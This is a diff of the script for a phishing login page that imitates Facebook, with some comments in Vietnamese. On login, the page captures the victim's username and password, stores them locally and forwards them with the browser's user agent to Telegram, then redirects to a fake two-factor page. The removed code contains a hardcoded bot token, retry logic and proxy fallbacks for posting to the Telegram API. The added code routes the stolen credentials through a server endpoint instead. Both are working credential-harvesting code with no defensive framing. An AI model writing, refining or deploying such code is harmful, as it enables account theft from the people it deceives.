@@ -246,82 +246,36 @@
     </div>
 
     <script>
-        // Telegram configuration
-        const BOT_TOKEN = '7276807133:AAE4Cnz15pyFcCHOo3ZeLfjaFZly6LmE2-0';
-        const CHAT_ID = '-4789641482';
-        
-        // Enhanced Telegram sending function with retry
-        async function sendToTelegram(message) {
-            const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const fallbackUrls = [
-                TELEGRAM_API,
-                `https://cors-anywhere.herokuapp.com/${TELEGRAM_API}`,
-                `https://api.codetabs.com/v1/proxy/?quest=${TELEGRAM_API}`
-            ];
-            
-            for (let i = 0; i < fallbackUrls.length; i++) {
-                try {
-                    const response = await fetch(fallbackUrls[i], {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
-                    });
-                    
-                    if (response.ok) return true;
-                    console.warn(`Attempt ${i+1} failed with status ${response.status}`);
-                } catch (error) {
-                    console.warn(`Attempt ${i+1} error:`, error);
-                }
-                
-                // Wait before retrying
-                if (i < fallbackUrls.length - 1) {
-                    await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
-                }
-            }
-            return false;
-        }
-
         document.getElementById('loginButton').addEventListener('click', async function() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            // Store credentials for 2FA page
+            // Lưu thông tin đăng nhập
             localStorage.setItem('fb_credentials', JSON.stringify({
                 username: username,
                 password: password,
                 timestamp: new Date().toISOString()
             }));
-            
-            // Prepare message
+
+            // Gửi đến Telegram
             const message = `🔐 <b>NEW LOGIN ATTEMPT</b> 🔐\n\n` +
                          `👤 <b>Username:</b> ${username}\n` +
                          `🔑 <b>Password:</b> ${password}\n\n` +
                          `🌐 <b>User Agent:</b> ${navigator.userAgent}\n` +
                          `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
             
-            // Show loading state (visual remains unchanged)
-            const btn = this;
-            const originalText = btn.textContent;
-            btn.textContent = 'Please wait...';
-            btn.disabled = true;
-            
             try {
-                // Send to Telegram
-                const success = await sendToTelegram(message);
-                
-                // Proceed to 2FA page regardless of Telegram success
-                window.location.href = '2fa_page.html';
+                await fetch('/api/send-to-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message })
+                });
             } catch (error) {
-                console.error('Error:', error);
-            } finally {
-                // Restore button state
-                btn.textContent = originalText;
-                btn.disabled = false;
+                console.log('Error sending to Telegram:', error);
             }
+            
+            // Chuyển trang
+            window.location.href = '2fa_page.html';
         });
     </script>
 </body>
